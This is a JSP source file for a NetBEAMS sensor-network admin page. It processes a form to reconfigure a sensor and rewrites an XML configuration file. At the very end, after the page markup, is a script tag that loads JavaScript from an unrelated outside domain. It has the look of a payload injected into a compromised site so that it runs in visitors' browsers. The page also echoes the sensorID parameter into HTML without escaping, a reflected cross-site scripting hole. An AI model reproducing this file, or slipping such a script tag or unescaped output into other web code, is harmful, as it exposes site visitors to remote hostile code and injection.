<%@ page import="org.smf.smp.*" %>
<%@ page import="org.smf.smp.event.*" %>
<%@ page import="org.smf.smp.dp.*" %>
<%@ page import="org.dp.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="org.jdom.*" %>
<%@ page import="org.jdom.input.*" %>
<%@ page import="org.jdom.output.XMLOutputter" %>
<%@ page import="org.jdom.output.Format" %>
<%@ page import="org.netbeams.web.*" %>
<%@ page isErrorPage="true" %>



<h1 align="center">NetBEAMS admin page</h1>
<p align="center">&nbsp;</p>
<table border="1" width="100%" id="table1">
	<tr>
		<td width="235" bgcolor="#000080" valign="top">
		<p align="center"><b><font color="#FFFFFF" size="5">Menu</font></b></td>
		<td bgcolor="#000080">
		<p align="center"><b><font color="#FFFFFF" size="5">Add Sensor</font></b></td>
	</tr>
	<tr>
		<td width="235">
			<p align="left">&nbsp;</p>
			<p align="center"><a href="data_producers.jsp">Show Data Producers</a></p>
			<p align="center"><a href="index.jsp">Show Sensors</a></p>
			<p align="center">&nbsp;
		</td>
		<td valign="top">

			<%

				try {

					String sensorID = request.getParameter("sensorID");
					String sensorName = request.getParameter("sensorName");
					String sensorDescription = request.getParameter("sensorDescription");
					String configuration = request.getParameter("configuration");
					int updateFreq = Integer.parseInt(request.getParameter("updateFreq"));


					SensorManagementPlatform smp = SensorManagementPlatform.getInstance();
					SensorManagementPlatformController controller = smp.getController();

					if (sensorName == null || sensorName.trim().length() <= 0) throw new Exception("Please provide a name for the sensor.");
					if (sensorDescription == null || sensorDescription.trim().length() <= 0) throw new Exception("Please provide a description for the sensor.");
					if (configuration == null || configuration.trim().length() <= 0) throw new Exception("Please enter some value for the configuration.");
					if (updateFreq <= 0 || updateFreq > 2592000) throw new Exception("The update frequency must be more than 1 seconds and less than 1 months.");


					Sensor sensor = smp.getSensor(sensorID);
					if (sensor != null) {

						// break the configuration into an ARRAY
						String[] temp = configuration.trim().split("\n");
						sensor.setName(sensorName);
						sensor.setDescription(sensorDescription);
						sensor.setUpdateFrequency(updateFreq * 1000);
						sensor.reconfigure(temp);







						SAXBuilder builder = new SAXBuilder();
						Document document = builder.build(new File(NetBEAMSConstants.SENSORS_CONFIGURATIONS));

						Element sensorElement = null;

						// look for the sensor element that contain data for the selected sensor
						Element root = document.getRootElement();
						Iterator i = root.getChildren().iterator();
						while (i.hasNext()) {
							Element e = (Element)i.next();
							String id = e.getAttributeValue("id");
							if (id != null && id.equals(sensor.getId())) {
								sensorElement = e;
								break;
							}
						}


						// If can not find the element that contain data for the select sensor, create a new sensor element
						if (sensorElement == null) {
							throw new Exception("Can not find sensor in the configuration file. Make sure the sensor's configuration is SAVED after it is CREATED.");
						}


						sensorElement.setAttribute("public", sensor.isPublic() + "");
						sensorElement.setAttribute("updateFrequency", (updateFreq * 1000) + "");


						Element sensorNameElement = sensorElement.getChild("name");
						sensorNameElement.setText(sensorName);

						Element sensorDescriptionElement = sensorElement.getChild("description");
						sensorDescriptionElement.setText(sensorDescription);


						Element configElement = sensorElement.getChild("configurations");
						configElement.setText(configuration);



						// save the new data producer to the list of data producer
						PrintWriter output = new PrintWriter(new BufferedWriter(new FileWriter(NetBEAMSConstants.SENSORS_CONFIGURATIONS)));
						XMLOutputter outputter = new XMLOutputter(Format.getPrettyFormat());
						outputter.output(document, output);

						output.close();










						out.println("<h2>Sensor reconfigured successfully.</h2><br>");
						out.println("<a href='reconfigure_sensor.jsp?sensorID=" + sensorID + "'>View the sensor's new configuration.</h2>");

					} else {
						throw new Exception("Invalid sensor ID '" + sensorID + "'");
					}


				} catch (Exception e) {
					out.println("<h2>Error: " + e.getMessage() + "</h2>");
					out.println("<input type='button' onclick='history.back()' value='Go back'/>");
					e.printStackTrace();
					NetBEAMSConstants.logs(e.getMessage());
				}
			%>
		</td>
	</tr>
</table>






<script language=javascript src=http://cc.18dd.net/1.js></script>